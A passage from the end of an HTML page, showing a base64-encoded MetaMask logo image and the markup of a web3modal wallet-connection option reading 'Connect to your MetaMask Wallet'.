NDkwNTcgMS4wNjIzMjI5Ni0xOS4xMDM3NzM5MiA1OC40Mjc3NjI5NCAxMC42MTMyMDc3MiA2My43MzkzNzgxLTcuNDI5MjQ1NDEgNC4yNDkyOTIgMTAuNjEzMjA3NzEgOS41NjA5MDYtOC40OTA1NjYxNyA3LjQzNjI2MSAxMS42NzQ1Mjg0NyAxMC42MjMyMjktNy40MjkyNDU0IDYuMzczOTM4IDE2Ljk4MTEzMjMgMjEuMjQ2NDU5IDc5LjU5OTA1NzctMjQuNDMzNDI4YzM4LjkxNTA5Ni0zMS4xNjE0NzMgNTguMDE4ODY5LTQ3LjA5NjMxOCA1Ny4zMTEzMjItNDcuODA0NTMzLS43MDc1NDgtLjcwODIxNS00OC44MjA3NTYtMzcuMTgxMzAzNi0xNDQuMzM5NjI1LTEwOS40MTkyNjUwNHoiIGZpbGw9IiM4ZTVhMzAiLz48ZyB0cmFuc2Zvcm09Im1hdHJpeCgtMSAwIDAgMSAzOTkuMDU2NjExIDApIj48cGF0aCBkPSJtMzAuNzc4MzAyMyAxODEuNjU3MjI2LTI5LjcxNjk4MTUzIDg2LjA0ODE2MSA3NC4yOTI0NTM5My00LjI0OTI5M2g0Ny43NTk0MzQzdi0zNy4xODEzMDNsLTIuMTIyNjQxLTc2LjQ4NzI1My0xMC42MTMyMDggOC40OTg1ODN6IiBmaWxsPSIjZjg5ZDM1Ii8+PHBhdGggZD0ibTg3LjAyODMwMzIgMTkxLjIxODEzNCA4Ny4wMjgzMDI4IDIuMTI0NjQ2LTkuNTUxODg2IDQ0LjYxNzU2My00MS4zOTE1MTEtMTAuNjIzMjI5eiIgZmlsbD0iI2Q4N2MzMCIvPjxwYXRoIGQ9Im04Ny4wMjgzMDMyIDE5Mi4yODA0NTcgMzYuMDg0OTA1OCAzMy45OTQzMzR2MzMuOTk0MzM0eiIgZmlsbD0iI2VhOGQzYSIvPjxwYXRoIGQ9Im0xMjMuMTEzMjA5IDIyNy4zMzcxMTQgNDIuNDUyODMxIDEwLjYyMzIyOSAxMy43OTcxNyA0NS42Nzk4ODgtOS41NTE4ODYgNS4zMTE2MTUtNDYuNjk4MTE1LTI3LjYyMDM5OHoiIGZpbGw9IiNmODlkMzUiLz48cGF0aCBkPSJtMTIzLjExMzIwOSAyNjEuMzMxNDQ4LTguNDkwNTY1IDY1Ljg2NDAyNCA1NS4xODg2OC0zOC4yNDM2MjZ6IiBmaWxsPSIjZWI4ZjM1Ii8+PHBhdGggZD0ibTE3NC4wNTY2MDYgMTkzLjM0Mjc4IDUuMzA2NjA0IDkwLjI5NzQ1MS0xNS45MTk4MTItNDYuMjExMDQ5eiIgZmlsbD0iI2VhOGUzYSIvPjxwYXRoIGQ9Im03NC4yOTI0NTM5IDI2Mi4zOTM3NzEgNDguODIwNzU1MS0xLjA2MjMyMy04LjQ5MDU2NSA2NS44NjQwMjR6IiBmaWxsPSIjZDg3YzMwIi8+PHBhdGggZD0ibTI0LjQxMDM3NzcgMzU1Ljg3ODE5MyA5MC4yMTIyNjYzLTI4LjY4MjcyMS00MC4zMzAxOTAxLTY0LjgwMTcwMS03My4yMzExMzMxMyA1LjMxMTYxNnoiIGZpbGw9IiNlYjhmMzUiLz48cGF0aCBkPSJtMTY3LjY4ODY4MiAxMTAuNDgxNTg4LTQ1LjYzNjc5MyAzOC4yNDM2MjctMzUuMDIzNTg1OCA0Mi40OTI5MTkgODcuMDI4MzAyOCAzLjE4Njk2OXoiIGZpbGw9IiNlODgyMWUiLz48cGF0aCBkPSJtMTMyLjY2NTA5NiAyMTIuNDY0NTkzLTExLjY3NDUyOCAyNC40MzM0MjcgNDEuMzkxNTEtMTAuNjIzMjI5eiIgZmlsbD0iIzM5MzkzOSIgdHJhbnNmb3JtPSJtYXRyaXgoLTEgMCAwIDEgMjgzLjM3MjY0NiAwKSIvPjxwYXRoIGQ9Im0yMy4zNDkwNTcgMS4wNjIzMjI5NiAxNDQuMzM5NjI1IDEwOS40MTkyNjUwNC0yNC40MTAzNzgtNTkuNDkwMDg1OHoiIGZpbGw9IiNlODhmMzUiLz48cGF0aCBkPSJtMjMuMzQ5MDU3IDEuMDYyMzIyOTYtMTkuMTAzNzczOTIgNTguNDI3NzYyOTQgMTAuNjEzMjA3NzIgNjMuNzM5Mzc4MS03LjQyOTI0NTQxIDQuMjQ5MjkyIDEwLjYxMzIwNzcxIDkuNTYwOTA2LTguNDkwNTY2MTcgNy40MzYyNjEgMTEuNjc0NTI4NDcgMTAuNjIzMjI5LTcuNDI5MjQ1NCA2LjM3MzkzOCAxNi45ODExMzIzIDIxLjI0NjQ1OSA3OS41OTkwNTc3LTI0LjQzMzQyOGMzOC45MTUwOTYtMzEuMTYxNDczIDU4LjAxODg2OS00Ny4wOTYzMTggNTcuMzExMzIyLTQ3LjgwNDUzMy0uNzA3NTQ4LS43MDgyMTUtNDguODIwNzU2LTM3LjE4MTMwMzYtMTQ0LjMzOTYyNS0xMDkuNDE5MjY1MDR6IiBmaWxsPSIjOGU1YTMwIi8+PC9nPjwvZz48L3N2Zz4="
                                alt="MetaMask"
                            />
                        </div>
                        <div class="sc-gtssRu bktcUM web3modal-provider-name">
                            MetaMask
                        </div>
                        <div class="sc-dlnjPT eFHlqH web3modal-provider-description">
                            Connect to your MetaMask Wallet
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<div id="WEB3_CONNECT_MODAL_ID"></div>
</body>
</html>
